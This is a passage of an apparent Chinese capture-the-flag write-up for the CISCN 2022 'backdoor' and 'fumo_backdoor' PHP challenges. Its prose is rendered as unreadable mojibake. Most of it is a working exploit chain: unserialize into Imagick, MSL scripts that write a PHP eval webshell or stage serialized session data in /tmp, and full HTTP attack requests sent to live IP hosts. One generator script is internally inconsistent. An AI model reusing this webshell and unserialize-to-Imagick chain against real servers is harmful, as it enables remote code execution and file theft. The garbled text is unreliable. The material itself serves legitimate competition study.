class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>è¯•ä¸€ä¸‹å®‰è£…æˆåŠŸæ²¡æœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=Imagick&amp;b=http://81.70.221.206:2333</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCDIwY6"><img src="https://s1.ax1x.com/2023/07/02/pCDIwY6.png" alt="pCDIwY6.png"></a></p><p>åˆ©ç”¨vidå»è§¦å‘mslè„šæœ¬ï¼Œé…åˆcaptionå†™å…¥shell</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;caption:&lt;?php @eval(@$_REQUEST[0]); ?&gt;&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;info:/var/www/html/shell.php&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆç®€å•çœ‹ä¸€ä¸‹æ­¤é¢˜çš„å‰èº«</p><h3 id="CISCN-2022-backdoor"><a href="#CISCN-2022-backdoor" class="headerlink" title="[CISCN 2022]backdoor"></a>[CISCN 2022]backdoor</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;stdclass&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;path)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;path;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;__sleep failed...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;do_exec_func &amp;&amp; </span><br><span class="line">                <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>, <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">            ) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">                <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>);</span></span><br><span class="line"><span class="class">            &#125;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">cmd</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">cmd</span>&#x27;];</span></span><br><span class="line"><span class="class">$<span class="title">data</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">data</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">switch</span> ($<span class="title">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Dockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.4</span>-apache</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> html /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> readflag/readflag /readflag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s#http://deb.debian.org#http://mirrors.aliyun.com#g&#x27;</span> /etc/apt/sources.list &amp;&amp;\</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; apt-get install -y libmagickwand-dev --no-install-recommends</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pecl install imagick &amp;&amp; docker-php-ext-enable imagick &amp;&amp;\</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> -R 555 /var/www/html &amp;&amp;\</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 400 /flag &amp;&amp;\</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 111 /readflag &amp;&amp; <span class="built_in">chmod</span> u+s /readflag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p>webç›®å½•ä¸å¯å†™ï¼Œæ·»åŠ imagickæ‰©å±•ï¼Œå­˜åœ¨readflagï¼Œéœ€è¦å‘½ä»¤æ‰§è¡Œ</p><p>ä»£ç æœ‰ä¸¤ä¸ªç±»</p><ol><li><code>__wakeup</code>å¯ä»¥æ‰§è¡Œä¸€æ¬¡ä»»æ„æ— å‚å‡½æ•°çš„ç»“æ„ï¼Œä»¥åŠå­˜åœ¨ä¸€ä¸ªnew  $a($b)ç»“æ„</li><li><code>__sleep</code>å¯ä»¥ä»»æ„æ–‡ä»¶åŒ…å«ã€‚</li></ol><p>å½“å‰ç¯å¢ƒä¸‹å”¯ä¸€å­˜åœ¨åºåˆ—åŒ–çš„åœ°æ–¹å°±æ˜¯<code>session</code>ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡sessionçš„åºåˆ—åŒ–æœºåˆ¶æ¥è§¦å‘<code>__sleep</code></p><p>å…ˆåˆ é™¤<code>/tmp</code>ä¸‹çš„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=rm</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆåºåˆ—åŒ–æ•°æ®å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;stdclass&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$backdoor</span>=<span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="variable">$backdoor</span>-&gt;<span class="class"><span class="keyword">class</span>=&quot;<span class="title">imagick</span>&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">backdoor</span>-&gt;<span class="title">argv</span>=&quot;<span class="title">vid</span>:<span class="title">msl</span>:/<span class="title">tmp</span>/<span class="title">php</span>*&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">backdoor</span>-&gt;<span class="title">do_exec_func</span>=0;</span></span><br><span class="line"><span class="class"><span class="title">echo</span> <span class="title">serialize</span>($<span class="title">backdoor</span>);</span></span><br></pre></td></tr></table></figure><p>ç„¶åå†™ä¸ª.msl</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line"> &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMF0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2V4ZWMiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=&quot; /&gt;</span><br><span class="line"> &lt;write filename=&quot;/tmp/sess_exec&quot; /&gt;</span><br><span class="line">&lt;/image&gt;</span><br></pre></td></tr></table></figure><p>å†™å…¥æ–‡ä»¶<code>/tmp/sess_shell</code>ï¼Œæ³¨æ„ä¸€ä¸‹<code>imagick</code>å¯¹æ–‡ä»¶æ ¼å¼è§£æè¾ƒä¸¥ï¼Œå¦‚æœç›´æ¥æ’å…¥<code>session</code>æ•°æ®ï¼Œä¼šå¯¼è‡´è§£æå›¾ç‰‡é”™è¯¯ï¼Œæ— æ³•å†™å…¥ã€‚</p><p>æ‰€ä»¥é‡‡å–<code>ppm</code>æ ¼å¼ï¼Œè§£ææ¯”è¾ƒå®½æ³›ï¼Œç»“æ„ååˆ†ç®€å•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /?data=O:8:%22backdoor%22:4:%7Bs:4:%22path%22;N;s:4:%22argv%22;s:17:%22vid:msl:/tmp/php%2A%22;s:5:%22class%22;s:7:%22imagick%22;s:12:%22do_exec_func%22;i:0;%7D&amp;cmd=unserialze HTTP/1.1</span><br><span class="line">User-Agent: Apifox/1.0.0 (https://www.apifox.cn)</span><br><span class="line">Accept: */*</span><br><span class="line">Host: 8.130.35.171:18080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------------------------293858329898186393824400</span><br><span class="line">Content-Length: 723</span><br><span class="line"></span><br><span class="line">----------------------------293858329898186393824400</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;exec.msl&quot;</span><br><span class="line">Content-Type: application/vnd.mobius.msl</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line"> &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMF0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2V4ZWMiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=&quot; /&gt;</span><br><span class="line"> &lt;write filename=&quot;/tmp/sess_exec&quot; /&gt;</span><br><span class="line">&lt;/image&gt;</span><br><span class="line">----------------------------293858329898186393824400--</span><br></pre></td></tr></table></figure><p>æˆåŠŸå†™å…¥ååˆ©ç”¨<code>session_start</code>è§¦å‘<code>__sleep</code></p><p><a href="https://imgse.com/i/pC532VK"><img src="https://s1.ax1x.com/2023/07/15/pC532VK.png" alt="pC532VK.png"></a></p><h3 id="fumo-backdoor-1"><a href="#fumo-backdoor-1" class="headerlink" title="fumo_backdoor"></a>fumo_backdoor</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="keyword">__DIR__</span>.<span class="string">&quot;:/tmp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;FUNC_LIST&quot;</span>, <span class="title function_ invoke__">get_defined_functions</span>());</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fumo_backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;path) &amp;&amp; </span><br><span class="line">            <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[flag]/m&#x27;</span>, <span class="variable">$this</span>-&gt;path) === <span class="number">0</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="title function_ invoke__">is_string</span>(<span class="variable">$func</span>) &amp;&amp; </span><br><span class="line">            <span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, FUNC_LIST[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">            <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>);</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">cmd</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">cmd</span>&#x27;];</span></span><br><span class="line"><span class="class">$<span class="title">data</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">data</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">switch</span> ($<span class="title">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp 2&gt;/dev/null&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Dockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.4</span>-apache</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> html /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s#http://deb.debian.org#http://mirrors.aliyun.com#g&#x27;</span> /etc/apt/sources.list &amp;&amp;\</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; apt-get install -y libmagickwand-dev --no-install-recommends</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pecl install imagick &amp;&amp; docker-php-ext-enable imagick &amp;&amp;\</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> -R 555 /var/www/html &amp;&amp;\</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 444 /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p>includeæ”¹æˆäº†readfileï¼Œå€’æ˜¯æ²¡æœ‰äº†&#x2F;readflagï¼Œä¼°æ‘¸ç€æ˜¯ç›´æ¥è¯»æ–‡ä»¶äº†</p><p>ç”Ÿæˆåºåˆ—åŒ–æ•°æ®å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fumo_backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;stdclass&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$backdoor</span>=<span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="variable">$backdoor</span>-&gt;<span class="class"><span class="keyword">class</span>=&quot;<span class="title">imagick</span>&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">backdoor</span>-&gt;<span class="title">argv</span>=&quot;<span class="title">vid</span>:<span class="title">msl</span>:/<span class="title">tmp</span>/<span class="title">php</span>*&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">backdoor</span>-&gt;<span class="title">do_exec_func</span>=0;</span></span><br><span class="line"><span class="class"><span class="title">echo</span> <span class="title">serialize</span>($<span class="title">backdoor</span>);</span></span><br></pre></td></tr></table></figure><p>å…ˆå†™ä¸ªsess_execæ–‡ä»¶ï¼Œé‡Œé¢å†™ä¸Šå¾…è§¦å‘çš„åºåˆ—åŒ–æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /?cmd=unserialze&amp;data=O:13:%22fumo_backdoor%22:4:%7Bs:4:%22path%22;N;s:4:%22argv%22;s:17:%22vid:msl:/tmp/php%2A%22;s:4:%22func%22;N;s:5:%22class%22;s:7:%22imagick%22;%7D HTTP/1.1</span><br><span class="line">User-Agent: Apifox/1.0.0 (https://www.apifox.cn)</span><br><span class="line">Accept: */*</span><br><span class="line">Host: 8.130.35.171:18081</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------------------------912950487724363274561069</span><br><span class="line">Content-Length: 721</span><br><span class="line"></span><br><span class="line">----------------------------912950487724363274561069</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;exec.msl&quot;</span><br><span class="line">Content-Type: application/vnd.mobius.msl</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line">&lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfE86MTM6ImZ1bW9fYmFja2Rvb3IiOjQ6e3M6NDoicGF0aCI7czo4OiIvdG1wL3JlcyI7czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30=&quot;/&gt;</span><br><span class="line">&lt;write filename=&quot;/tmp/sess_exec&quot;/&gt;</span><br><span class="line">&lt;/image&gt;</span><br><span class="line">----------------------------912950487724363274561069--</span><br></pre></td></tr></table></figure><p>ç”±äºæ²¡æœ‰äº†includeï¼Œè¿˜å­˜åœ¨open_basediré™åˆ¶ï¼Œæ‰€ä»¥é‡‡å–å°†flagå†™å…¥&#x2F;tmpç›®å½•ä¸‹ï¼Œä¹‹åç”¨readfileå»è¯»</p><p>å…³é”®åœ¨äºé€‰æ‹©ä¸€ä¸ªåˆé€‚çš„æ ¼å¼ï¼Œè¿™é‡Œé€‰æ‹©ç”¨iccåè®®æ¥è¯»flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /?cmd=unserialze&amp;data=O:13:%22fumo_backdoor%22:4:%7Bs:4:%22path%22;N;s:4:%22argv%22;s:17:%22vid:msl:/tmp/php%2A%22;s:4:%22func%22;N;s:5:%22class%22;s:7:%22imagick%22;%7D HTTP/1.1</span><br><span class="line">User-Agent: Apifox/1.0.0 (https://www.apifox.cn)</span><br><span class="line">Accept: */*</span><br><span class="line">Host: 8.130.35.171:18081</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------------------------322407393146894488301949</span><br><span class="line">Content-Length: 339</span><br><span class="line"></span><br><span class="line">----------------------------322407393146894488301949</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;exec.msl&quot;</span><br><span class="line">Content-Type: application/vnd.mobius.msl</span><br><span class="line"></span><br><span class="line">&lt;?xml 